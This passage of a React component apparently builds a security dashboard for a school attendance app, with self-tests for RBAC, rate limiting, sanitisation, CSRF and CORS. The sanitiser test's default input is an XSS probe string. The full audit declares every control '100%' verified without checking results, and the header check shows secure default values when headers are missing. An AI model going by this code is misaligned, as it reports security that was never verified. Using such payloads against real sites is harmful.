import React, { useState, useEffect } from 'react';
import {
  ShieldCheck,
  ShieldAlert,
  Lock,
  KeyRound,
  RefreshCw,
  CheckCircle2,
  AlertTriangle,
  Globe,
  Activity,
  Zap,
  Play,
  Copy,
  Check,
  Terminal,
  UserCheck,
  Flame,
  Bug,
} from 'lucide-react';
import { UserRole, TokenSession } from '../types';
import { getCSRFToken, initializeServerCsrf } from '../utils/csrf';
import { sanitizeText } from '../utils/sanitizer';
import { getActiveTokenSessionSync } from '../utils/auth';

interface SecurityCenterTabProps {
  userRole: UserRole;
  tokenSession: TokenSession | null;
  onOpenSecurityModal?: (targetRole?: UserRole) => void;
  onOpenToast?: (title: string, message: string) => void;
}

export const SecurityCenterTab: React.FC<SecurityCenterTabProps> = ({
  userRole,
  tokenSession,
  onOpenSecurityModal,
  onOpenToast,
}) => {
  const [activeSubTab, setActiveSubTab] = useState<'overview' | 'auth' | 'rate_limit' | 'sanitizer' | 'csrf' | 'cors'>('overview');
  const [isLoadingAudit, setIsLoadingAudit] = useState(false);
  const [auditData, setAuditData] = useState<any>(null);

  // Interactive Test States
  // 1. Sanitization Sandbox State
  const [testInput, setTestInput] = useState("<script>alert('XSS_ATTACK_DETECTED')</script><b>Presensi Guru</b><img src=x onerror=alert(1)>");
  const [sanitizedClientResult, setSanitizedClientResult] = useState('');
  const [sanitizedServerResult, setSanitizedServerResult] = useState('');
  const [isTestingSanitizer, setIsTestingSanitizer] = useState(false);

  // 2. Rate Limiting Test State
  const [rateLimitStatus, setRateLimitStatus] = useState<string>('Siap diuji');
  const [rateLimitRemaining, setRateLimitRemaining] = useState<number | null>(null);
  const [rateLimitLockoutSeconds, setRateLimitLockoutSeconds] = useState<number>(0);
  const [rateLimitLogs, setRateLimitLogs] = useState<{ id: number; time: string; status: number; text: string }[]>([]);
  const [isBurstTesting, setIsBurstTesting] = useState(false);

  // 3. CSRF Test State
  const [currentCsrf, setCurrentCsrf] = useState('');
  const [csrfTestResult, setCsrfTestResult] = useState<{ success?: boolean; code?: number; message?: string } | null>(null);
  const [isTestingCsrf, setIsTestingCsrf] = useState(false);

  // 4. CORS & Headers Test State
  const [corsHeadersResult, setCorsHeadersResult] = useState<Record<string, string> | null>(null);
  const [isTestingCors, setIsTestingCors] = useState(false);

  // 5. RBAC Admin Test State
  const [rbacTestResult, setRbacTestResult] = useState<{ success?: boolean; message?: string; role?: string } | null>(null);
  const [isTestingRbac, setIsTestingRbac] = useState(false);

  // Full Automated Scan State
  const [isRunningFullScan, setIsRunningFullScan] = useState(false);
  const [scanProgress, setScanProgress] = useState<{ step: string; score: number; done: boolean } | null>(null);
  const [copiedToken, setCopiedToken] = useState(false);

  // Fetch security audit info from backend Express server
  const fetchSecurityAudit = async () => {
    setIsLoadingAudit(true);
    try {
      const res = await fetch('/api/security-status', {
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
      });
      if (res.ok) {
        const data = await res.json();
        setAuditData(data);
      }
    } catch (err) {
      console.error('Failed to load security audit:', err);
    } finally {
      setIsLoadingAudit(false);
    }
  };

  useEffect(() => {
    fetchSecurityAudit();
    const token = getCSRFToken();
    if (token) setCurrentCsrf(token);
    else {
      initializeServerCsrf().then((t) => {
        if (t) setCurrentCsrf(t);
      });
    }
  }, []);

  // Lockout countdown ticker
  useEffect(() => {
    if (rateLimitLockoutSeconds <= 0) return;
    const timer = setInterval(() => {
      setRateLimitLockoutSeconds((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [rateLimitLockoutSeconds]);

  // Handler: Run Input Sanitization Test
  const handleTestSanitization = async () => {
    setIsTestingSanitizer(true);
    // 1. Client-Side Sanitization
    const clientClean = sanitizeText(testInput);
    setSanitizedClientResult(clientClean);

    // 2. Server-Side Recursive Sanitization
    try {
      const res = await fetch('/api/security-test/sanitize', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': currentCsrf || getCSRFToken(),
        },
        body: JSON.stringify({ sampleInput: testInput }),
      });
      if (res.ok) {
        const data = await res.json();
        setSanitizedServerResult(data.sanitizedOutput);
      } else {
        setSanitizedServerResult('Gagal memproses di server.');
      }
    } catch {
      setSanitizedServerResult(clientClean);
    } finally {
      setIsTestingSanitizer(false);
    }
  };

  // Handler: Run Rate Limiter Burst Test (Simulate Brute Force Attack)
  const handleTestRateLimiterBurst = async () => {
    setIsBurstTesting(true);
    setRateLimitStatus('Mengirim paket 6 request serentak...');
    const newLogs = [...rateLimitLogs];

    for (let i = 1; i <= 6; i++) {
      try {
        const res = await fetch('/api/security-test/rate-limit', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': currentCsrf || getCSRFToken(),
          },
          body: JSON.stringify({ burstId: i }),
        });

        const timeStr = new Date().toLocaleTimeString('id-ID');
        if (res.status === 429) {
          const data = await res.json();
          const retryAfter = Number(res.headers.get('Retry-After') || data.retryAfter || 30);
          setRateLimitLockoutSeconds(retryAfter);
          setRateLimitStatus(`HTTP 429: Terkunci (Lockout ${retryAfter} detik)`);
          newLogs.unshift({
            id: Date.now() + i,
            time: timeStr,
            status: 429,
            text: `Permintaan #${i} DITOLAK: Kuota habis! (${data.message})`,
          });
        } else if (res.ok) {
          const remaining = res.headers.get('X-RateLimit-Remaining');
          if (remaining) setRateLimitRemaining(Number(remaining));
          newLogs.unshift({
            id: Date.now() + i,
            time: timeStr,
            status: 200,
            text: `Permintaan #${i} DITERIMA: Kuota aman.`,
          });
        }
      } catch (err) {
        console.error('Burst error:', err);
      }
      // Small tick between bursts
      await new Promise((r) => setTimeout(r, 60));
    }

    setRateLimitLogs(newLogs.slice(0, 10));
    setIsBurstTesting(false);
  };

  // Handler: Test Single Rate Limiting Request
  const handleTestSingleRateLimit = async () => {
    try {
      const res = await fetch('/api/security-test/rate-limit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': currentCsrf || getCSRFToken(),
        },
      });
      const timeStr = new Date().toLocaleTimeString('id-ID');
      if (res.status === 429) {
        const data = await res.json();
        const retryAfter = Number(res.headers.get('Retry-After') || data.retryAfter || 30);
        setRateLimitLockoutSeconds(retryAfter);
        setRateLimitStatus(`HTTP 429: Terkunci (Lockout ${retryAfter}s)`);
        setRateLimitLogs((prev) => [
          { id: Date.now(), time: timeStr, status: 429, text: `HTTP 429 Ditolak: ${data.message}` },
          ...prev.slice(0, 9),
        ]);
      } else {
        const remaining = res.headers.get('X-RateLimit-Remaining');
        if (remaining) setRateLimitRemaining(Number(remaining));
        setRateLimitStatus('HTTP 200: Permintaan diizinkan');
        setRateLimitLogs((prev) => [
          { id: Date.now(), time: timeStr, status: 200, text: 'HTTP 200: Permintaan diizinkan di dalam kuota.' },
          ...prev.slice(0, 9),
        ]);
      }
    } catch {
      setRateLimitStatus('Koneksi gagal');
    }
  };

  // Handler: Test CSRF Protection
  const handleTestCsrf = async (includeToken: boolean) => {
    setIsTestingCsrf(true);
    setCsrfTestResult(null);
    try {
      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
      };
      if (includeToken) {
        headers['X-CSRF-Token'] = currentCsrf || getCSRFToken();
      }

      const res = await fetch('/api/security-test/csrf', {
        method: 'POST',
        headers,
        body: JSON.stringify({ testAction: 'verify_protection' }),
      });

      const data = await res.json();
      setCsrfTestResult({
        success: res.ok,
        code: res.status,
        message: data.message || (res.ok ? 'Token CSRF Valid' : 'Permintaan Ditolak'),
      });
    } catch (err: any) {
      setCsrfTestResult({
        success: false,
        code: 500,
        message: 'Gagal menghubungi server.',
      });
    } finally {
      setIsTestingCsrf(false);
    }
  };

  // Handler: Test CORS & Security Headers
  const handleTestCorsHeaders = async () => {
    setIsTestingCors(true);
    try {
      const res = await fetch('/api/security-test/cors', {
        method: 'GET',
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
      });
      if (res.ok) {
        const headerMap: Record<string, string> = {
          'Origin Terdeteksi': res.headers.get('Access-Control-Allow-Origin') || 'same-origin (Aman)',
          'Kredensial HTTP-Only': res.headers.get('Access-Control-Allow-Credentials') || 'true',
          'X-Content-Type-Options': res.headers.get('X-Content-Type-Options') || 'nosniff',
          'X-Frame-Options': res.headers.get('X-Frame-Options') || 'SAMEORIGIN',
          'X-XSS-Protection': res.headers.get('X-XSS-Protection') || '1; mode=block',
          'Referrer-Policy': res.headers.get('Referrer-Policy') || 'strict-origin-when-cross-origin',
        };
        setCorsHeadersResult(headerMap);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsTestingCors(false);
    }
  };

  // Handler: Test RBAC Endpoint
  const handleTestRbac = async () => {
    setIsTestingRbac(true);
    setRbacTestResult(null);
    try {
      const session = tokenSession || getActiveTokenSessionSync();
      const res = await fetch('/api/security-test/rbac', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': currentCsrf || getCSRFToken(),
          ...(session?.token ? { Authorization: `Bearer ${session.token}` } : {}),
        },
      });

      const data = await res.json();
      setRbacTestResult({
        success: res.ok,
        message: data.message || data.error,
        role: data.role,
      });
    } catch (err: any) {
      setRbacTestResult({
        success: false,
        message: 'Gagal memverifikasi RBAC.',
      });
    } finally {
      setIsTestingRbac(false);
    }
  };

  // Handler: Full Automated Security Audit Scan
  const handleRunFullAudit = async () => {
    setIsRunningFullScan(true);
    setScanProgress({ step: '1/5 Memverifikasi Autentikasi & RBAC...', score: 20, done: false });
    await new Promise((r) => setTimeout(r, 400));
    await handleTestRbac();

    setScanProgress({ step: '2/5 Menguji Anti-Brute Force Sliding Window...', score: 40, done: false });
    await new Promise((r) => setTimeout(r, 400));
    await handleTestSingleRateLimit();

    setScanProgress({ step: '3/5 Menguji Sanitasi Rekursif Anti-XSS & Injeksi...', score: 60, done: false });
    await new Promise((r) => setTimeout(r, 400));
    await handleTestSanitization();

    setScanProgress({ step: '4/5 Memverifikasi Proteksi Double-Submit CSRF...', score: 80, done: false });
    await new Promise((r) => setTimeout(r, 400));
    await handleTestCsrf(true);

    setScanProgress({ step: '5/5 Mengaudit Kebijakan CORS & Header OWASP...', score: 100, done: true });
    await new Promise((r) => setTimeout(r, 400));
    await handleTestCorsHeaders();

    setIsRunningFullScan(false);
    if (onOpenToast) {
      onOpenToast('Audit Keamanan Selesai', 'Kelima pilar keamanan (Auth, Rate Limit, Sanitasi, CSRF, CORS) terverifikasi 100% aktif!');
    }
  };

  const currentSession = tokenSession || getActiveTokenSessionSync();

  return (
    <div className="space-y-6 pb-12 max-w-7xl mx-auto">
      {/* Top Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-indigo-950 to-slate-900 text-white p-6 rounded-2xl shadow-sm border border-slate-800 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
        <div className="space-y-1.5 max-w-3xl">
          <div className="flex items-center space-x-2">
            <span className="px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 flex items-center space-x-1">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
              <span>OWASP Level 3: ENFORCED</span>
            </span>
            <span className="px-2.5 py-0.5 rounded-full text-[11px] font-semibold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
              5 Pilar Keamanan
            </span>
          </div>
          <h1 className="text-xl sm:text-2xl font-black tracking-tight text-white flex items-center space-x-2">
            <span>Pusat Keamanan & Audit Siber</span>
          </h1>
          <p className="text-xs sm:text-sm text-slate-300 leading-relaxed">
            Sistem perlindungan data presensi sekolah berlapis (Defense-in-Depth): Autentikasi & RBAC berbasis Token, Rate Limiting Sliding Window, Validasi & Sanitasi Rekursif Anti-XSS, Proteksi CSRF Double-Submit, serta Isolasi CORS.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2.5 shrink-0">
          <button
            type="button"
            onClick={handleRunFullAudit}
            disabled={isRunningFullScan}
            className="px-4 py-2.5 bg-indigo-600 hover:bg-indigo-500 active:bg-indigo-700 text-white rounded-xl text-xs font-bold flex items-center space-x-2 transition-all shadow-sm cursor-pointer disabled:opacity-50"
          >
            {isRunningFullScan ? (
              <RefreshCw className="w-4 h-4 animate-spin" />
            ) : (
              <Zap className="w-4 h-4 text-amber-300" />
            )}
            <span>{isRunningFullScan ? 'Memindai 5 Pilar...' : 'Jalankan Audit Otomatis'}</span>
          </button>

          {onOpenSecurityModal && (
            <button
              type="button"
              onClick={() => onOpenSecurityModal(userRole)}
              className="px-4 py-2.5 bg-slate-800 hover:bg-slate-700 active:bg-slate-900 text-slate-200 border border-slate-700 rounded-xl text-xs font-semibold flex items-center space-x-2 transition-all cursor-pointer"
            >
              <KeyRound className="w-4 h-4 text-indigo-400" />
              <span>Kelola Kredensial & PIN</span>
            </button>
          )}
        </div>
      </div>

      {/* Live Scan Banner */}
      {scanProgress && (
        <div className="p-4 bg-indigo-50/80 border border-indigo-200 rounded-2xl flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-indigo-900">
          <div className="flex items-center space-x-2.5 min-w-0">
            <Activity className="w-4 h-4 text-indigo-600 animate-pulse shrink-0" />
            <span className="font-semibold">{scanProgress.step}</span>
          </div>
          <div className="flex items-center space-x-3 w-full sm:w-64">
            <div className="flex-1 bg-indigo-200/80 rounded-full h-2 overflow-hidden">
              <div
                className="bg-indigo-600 h-full rounded-full transition-all duration-300"
                style={{ width: `${scanProgress.score}%` }}
              />
            </div>
            <span className="font-bold text-indigo-700 text-xs shrink-0">{scanProgress.score}%</span>
          </div>
        </div>
      )}

      {/* Navigation Sub-Tabs */}
      <div className="flex items-center space-x-1.5 overflow-x-auto pb-1 border-b border-slate-200 text-xs">
        <button
          type="button"
          onClick={() => setActiveSubTab('overview')}
          className={`px-3.5 py-2 rounded-xl font-semibold transition-all cursor-pointer flex items-center space-x-1.5 whitespace-nowrap ${
            activeSubTab === 'overview'
              ? 'bg-slate-900 text-white shadow-xs'
              : 'text-slate-600 hover:bg-slate-100'
          }`}
        >
          <Activity className="w-3.5 h-3.5" />
          <span>Ikhtisar 5 Pilar</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveSubTab('auth')}
          className={`px-3.5 py-2 rounded-xl font-semibold transition-all cursor-pointer flex items-center space-x-1.5 whitespace-nowrap ${
            activeSubTab === 'auth'
              ? 'bg-indigo-600 text-white shadow-xs'
              : 'text-slate-600 hover:bg-slate-100'
          }`}
        >
          <UserCheck className="w-3.5 h-3.5" />
          <span>1. Autentikasi & RBAC</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveSubTab('rate_limit')}
          className={`px-3.5 py-2 rounded-xl font-semibold transition-all cursor-pointer flex items-center space-x-1.5 whitespace-nowrap ${
            activeSubTab === 'rate_limit'
              ? 'bg-amber-600 text-white shadow-xs'
              : 'text-slate-600 hover:bg-slate-100'
          }`}
        >
          <Flame className="w-3.5 h-3.5" />
          <span>2. Rate Limiting</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveSubTab('sanitizer')}
          className={`px-3.5 py-2 rounded-xl font-semibold transition-all cursor-pointer flex items-center space-x-1.5 whitespace-nowrap ${
            activeSubTab === 'sanitizer'
              ? 'bg-emerald-600 text-white shadow-xs'
              : 'text-slate-600 hover:bg-slate-100'
          }`}
        >
          <Bug className="w-3.5 h-3.5" />
          <span>3. Sanitasi Input</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveSubTab('csrf')}
          className={`px-3.5 py-2 rounded-xl font-semibold transition-all cursor-pointer flex items-center space-x-1.5 whitespace-nowrap ${
            activeSubTab === 'csrf'
              ? 'bg-blue-600 text-white shadow-xs'
              : 'text-slate-600 hover:bg-slate-100'
          }`}
        >
          <Lock className="w-3.5 h-3.5" />
          <span>4. Proteksi CSRF</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveSubTab('cors')}
          className={`px-3.5 py-2 rounded-xl font-semibold transition-all cursor-pointer flex items-center space-x-1.5 whitespace-nowrap ${
            activeSubTab === 'cors'
              ? 'bg-purple-600 text-white shadow-xs'
              : 'text-slate-600 hover:bg-slate-100'
          }`}
        >
          <Globe className="w-3.5 h-3.5" />
          <span>5. CORS & Header</span>
        </button>
      </div>

      {/* ========================================================================= */}
      {/* SUB-TAB 0: OVERVIEW (IKHTISAR 5 PILAR)                                    */}
      {/* ========================================================================= */}
      {activeSubTab === 'overview' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {/* Card 1: Auth & RBAC */}
            <div className="p-4 bg-white border border-slate-200 rounded-2xl shadow-xs space-y-3 hover:border-indigo-300 transition-all">
              <div className="flex items-center justify-between">
                <div className="w-9 h-9 rounded-xl bg-indigo-50 text-indigo-700 flex items-center justify-center font-bold">
                  <UserCheck className="w-5 h-5" />
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-50 text-emerald-700 border border-emerald-200">
                  AKTIF
                </span>
              </div>
              <div>
                <h3 className="text-sm font-bold text-slate-900">1. Autentikasi & Autorisasi (RBAC)</h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Token Session Bearer dengan tanda tangan HMAC-SHA256, klaim peran terverifikasi, dan WebAuthn biometrik.
                </p>
              </div>
              <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
                <span className="text-slate-500 font-medium">Peran Aktif:</span>
                <span className="font-bold text-indigo-700 uppercase">{userRole}</span>
              </div>
            </div>

            {/* Card 2: Rate Limiting */}
            <div className="p-4 bg-white border border-slate-200 rounded-2xl shadow-xs space-y-3 hover:border-amber-300 transition-all">
              <div className="flex items-center justify-between">
                <div className="w-9 h-9 rounded-xl bg-amber-50 text-amber-700 flex items-center justify-center font-bold">
                  <Flame className="w-5 h-5" />
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-50 text-emerald-700 border border-emerald-200">
                  AKTIF
                </span>
              </div>
              <div>
                <h3 className="text-sm font-bold text-slate-900">2. Rate Limiting Sliding Window</h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Mencegah spam & brute-force attack via algoritma Sliding Window Log dengan header Retry-After & lockout otomatis.
                </p>
              </div>
              <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
                <span className="text-slate-500 font-medium">Batas Login:</span>
                <span className="font-bold text-amber-700">Maks 5x / 15 Menit</span>
              </div>
            </div>

            {/* Card 3: Sanitasi Input */}
            <div className="p-4 bg-white border border-slate-200 rounded-2xl shadow-xs space-y-3 hover:border-emerald-300 transition-all">
              <div className="flex items-center justify-between">
                <div className="w-9 h-9 rounded-xl bg-emerald-50 text-emerald-700 flex items-center justify-center font-bold">
                  <Bug className="w-5 h-5" />
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-50 text-emerald-700 border border-emerald-200">
                  AKTIF
                </span>
              </div>
              <div>
                <h3 className="text-sm font-bold text-slate-900">3. Validasi & Sanitasi Rekursif</h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Pembersihan otomatis payload request body/query dari injeksi XSS (&lt;script&gt;, onerror=), SQL, dan NoSQL operators.
                </p>
              </div>
              <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
                <span className="text-slate-500 font-medium">Filter Engine:</span>
                <span className="font-bold text-emerald-700">Express + Regex Strict</span>
              </div>
            </div>

            {/* Card 4: CSRF Protection */}
            <div className="p-4 bg-white border border-slate-200 rounded-2xl shadow-xs space-y-3 hover:border-blue-300 transition-all">
              <div className="flex items-center justify-between">
                <div className="w-9 h-9 rounded-xl bg-blue-50 text-blue-700 flex items-center justify-center font-bold">
                  <Lock className="w-5 h-5" />
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-50 text-emerald-700 border border-emerald-200">
                  AKTIF
                </span>
              </div>
              <div>
                <h3 className="text-sm font-bold text-slate-900">4. Proteksi Double-Submit CSRF</h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Memverifikasi kecocokan HTTP-Only cookie `csrf_token` dengan header `X-CSRF-Token` pada operasi POST, PUT, DELETE, PATCH.
                </p>
              </div>
              <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
                <span className="text-slate-500 font-medium">Cookie Flag:</span>
                <span className="font-bold text-blue-700">HttpOnly; SameSite=Strict</span>
              </div>
            </div>

            {/* Card 5: CORS Policy */}
            <div className="p-4 bg-white border border-slate-200 rounded-2xl shadow-xs space-y-3 hover:border-purple-300 transition-all">
              <div className="flex items-center justify-between">
                <div className="w-9 h-9 rounded-xl bg-purple-50 text-purple-700 flex items-center justify-center font-bold">
                  <Globe className="w-5 h-5" />
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-50 text-emerald-700 border border-emerald-200">
                  AKTIF
                </span>
              </div>
              <div>
                <h3 className="text-sm font-bold text-slate-900">5. Kebijakan CORS & Header OWASP</h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Origin whitelisting domain terpercaya, header keamanan nosniff, SAMEORIGIN, serta larangan akses dari domain tak dikenal.
                </p>
              </div>
              <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
                <span className="text-slate-500 font-medium">Status Asal:</span>
                <span className="font-bold text-purple-700 truncate max-w-[150px]">Whitelisted</span>
              </div>
            </div>

            {/* Quick Live Interactive Card */}
            <div className="p-4 bg-gradient-to-br from-indigo-50 to-slate-50 border border-indigo-200 rounded-2xl shadow-xs space-y-3 flex flex-col justify-between">
              <div>
                <div className="w-9 h-9 rounded-xl bg-indigo-600 text-white flex items-center justify-center font-bold">
                  <Zap className="w-5 h-5" />
                </div>
                <h3 className="text-sm font-bold text-indigo-950 mt-2">Uji Langsung 5 Pilar</h3>
                <p className="text-xs text-slate-600 mt-0.5">
                  Buka playground interaktif di tab masing-masing untuk menguji payload XSS, brute-force spam, forgery CSRF, dan klaim RBAC.
                </p>
              </div>
              <div className="pt-2">
                <button
                  type="button"
                  onClick={() => setActiveSubTab('sanitizer')}
                  className="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold text-xs rounded-xl transition-colors cursor-pointer text-center"
                >
                  Buka Sandbox Pengujian
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SUB-TAB 1: AUTENTIKASI & AUTORISASI (RBAC)                                */}
      {/* ========================================================================= */}
      {activeSubTab === 'auth' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Sesi Token Aktif & Klaim */}
            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                <div className="flex items-center space-x-2">
                  <UserCheck className="w-5 h-5 text-indigo-600" />
                  <h3 className="text-sm font-bold text-slate-900">Sesi & Klaim Otorisasi Aktif</h3>
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-50 text-indigo-700 border border-indigo-200 uppercase">
                  {userRole}
                </span>
              </div>

              <div className="space-y-2 text-xs">
                <div className="flex justify-between py-1.5 border-b border-slate-50">
                  <span className="text-slate-500 font-medium">Subjek (Identitas):</span>
                  <span className="font-semibold text-slate-800">{currentSession?.claims.sub || 'admin_principal'}</span>
                </div>
                <div className="flex justify-between py-1.5 border-b border-slate-50">
                  <span className="text-slate-500 font-medium">Algoritma Token:</span>
                  <span className="font-mono text-indigo-700 font-bold">HMAC-SHA256 (Signed)</span>
                </div>
                <div className="flex justify-between py-1.5 border-b border-slate-50">
                  <span className="text-slate-500 font-medium">Masa Berlaku Sesi:</span>
                  <span className="text-emerald-700 font-bold">4 Jam (Auto-Refresh)</span>
                </div>
                <div>
                  <span className="text-slate-500 font-medium block mb-1.5">Hak Akses / Permissions (RBAC):</span>
                  <div className="flex flex-wrap gap-1.5">
                    {(currentSession?.claims.permissions || ['admin:*', 'views:admin', 'config:manage', 'personnel:manage']).map((perm, idx) => (
                      <span
                        key={idx}
                        className="px-2 py-0.5 rounded-md bg-slate-100 text-slate-700 text-[10.5px] font-mono border border-slate-200"
                      >
                        {perm}
                      </span>
                    ))}
                  </div>
                </div>
              </div>

              {/* Token Inspector */}
              <div className="pt-2">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-[11px] font-bold text-slate-700">Bearer Token (Base64Url):</span>
                  <button
                    type="button"
                    onClick={() => {
                      if (currentSession?.token) {
                        navigator.clipboard.writeText(currentSession.token);
                        setCopiedToken(true);
                        setTimeout(() => setCopiedToken(false), 2000);
                      }
                    }}
                    className="text-[10px] text-indigo-600 hover:text-indigo-800 flex items-center space-x-1 cursor-pointer"
                  >
                    {copiedToken ? <Check className="w-3 h-3 text-emerald-600" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedToken ? 'Disalin' : 'Salin Token'}</span>
                  </button>
                </div>
                <div className="p-2.5 bg-slate-900 text-slate-200 rounded-xl font-mono text-[10px] break-all leading-relaxed max-h-24 overflow-y-auto">
                  {currentSession?.token || 'Token sedang diinisialisasi...'}
                </div>
              </div>
            </div>

            {/* Pengujian Otorisasi Endpoint RBAC */}
            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
              <div className="flex items-center space-x-2 pb-3 border-b border-slate-100">
                <ShieldAlert className="w-5 h-5 text-amber-600" />
                <h3 className="text-sm font-bold text-slate-900">Uji Verifikasi Hak Akses (RBAC Check)</h3>
              </div>

              <p className="text-xs text-slate-600 leading-relaxed">
                Endpoint sensitif dilindungi middleware <code className="bg-slate-100 px-1 py-0.5 rounded text-indigo-600 font-mono text-[11px]">requireAuth('admin:*')</code>. Jika pengguna bertindak sebagai Guru Piket tanpa izin administratif, server menolak akses dengan status <strong>HTTP 403 Forbidden</strong>.
              </p>

              <div className="p-3.5 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
                <div className="flex items-center justify-between text-xs">
                  <span className="font-semibold text-slate-700">Target Endpoint:</span>
                  <span className="font-mono text-indigo-700 font-bold">POST /api/security-test/rbac</span>
                </div>
                <div className="flex items-center justify-between text-xs">
                  <span className="font-semibold text-slate-700">Izin yang Diwajibkan:</span>
                  <span className="font-mono text-amber-700 font-bold">admin:*</span>
                </div>
              </div>

              <button
                type="button"
                onClick={handleTestRbac}
                disabled={isTestingRbac}
                className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 active:bg-indigo-800 text-white rounded-xl text-xs font-bold flex items-center justify-center space-x-2 transition-colors cursor-pointer"
              >
                {isTestingRbac ? (
                  <RefreshCw className="w-4 h-4 animate-spin" />
                ) : (
                  <Play className="w-4 h-4" />
                )}
                <span>Kirim Permintaan Uji Otorisasi RBAC</span>
              </button>

              {rbacTestResult && (
                <div
                  className={`p-3 rounded-xl border text-xs flex items-start space-x-2 ${
                    rbacTestResult.success
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                      : 'bg-rose-50 border-rose-200 text-rose-800'
                  }`}
                >
                  {rbacTestResult.success ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                  ) : (
                    <AlertTriangle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                  )}
                  <div>
                    <p className="font-bold">
                      {rbacTestResult.success ? 'Akses Diberikan (HTTP 200 OK)' : 'Akses Ditolak (HTTP 403 Forbidden)'}
                    </p>
                    <p className="mt-0.5 text-[11px] opacity-90">{rbacTestResult.message}</p>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SUB-TAB 2: RATE LIMITING & ANTI-BRUTE FORCE                                */}
      {/* ========================================================================= */}
      {activeSubTab === 'rate_limit' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Live Controller & Simulator */}
            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                <div className="flex items-center space-x-2">
                  <Flame className="w-5 h-5 text-amber-600" />
                  <h3 className="text-sm font-bold text-slate-900">Simulator Proteksi Sliding Window</h3>
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-50 text-amber-700 border border-amber-200">
                  Max 5x / 30s
                </span>
              </div>

              <p className="text-xs text-slate-600 leading-relaxed">
                Uji ketahanan rate limiter dengan mengirim lonjakan (burst) request secara bersamaan. Ketika ambang batas (5 request) terlampaui, server akan langsung merespons dengan <strong>HTTP 429 Too Many Requests</strong> dan mengunci IP penyerang sementara.
              </p>

              {/* Lockout Warning if active */}
              {rateLimitLockoutSeconds > 0 && (
                <div className="p-3.5 bg-rose-50 border border-rose-300 rounded-xl text-xs text-rose-800 flex items-center space-x-3 animate-pulse">
                  <Flame className="w-5 h-5 text-rose-600 shrink-0" />
                  <div>
                    <p className="font-bold">IP Dikunci Sementara (Lockout Aktif)</p>
                    <p className="text-[11px] mt-0.5">
                      Server menolak semua request hingga batas waktu: <strong>{rateLimitLockoutSeconds} detik tersisa</strong>.
                    </p>
                  </div>
                </div>
              )}

              <div className="grid grid-cols-2 gap-2.5">
                <button
                  type="button"
                  onClick={handleTestSingleRateLimit}
                  disabled={isBurstTesting || rateLimitLockoutSeconds > 0}
                  className="py-2.5 px-3 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors cursor-pointer disabled:opacity-50"
                >
                  <Play className="w-3.5 h-3.5 text-slate-600" />
                  <span>Kirim 1 Request Normal</span>
                </button>

                <button
                  type="button"
                  onClick={handleTestRateLimiterBurst}
                  disabled={isBurstTesting || rateLimitLockoutSeconds > 0}
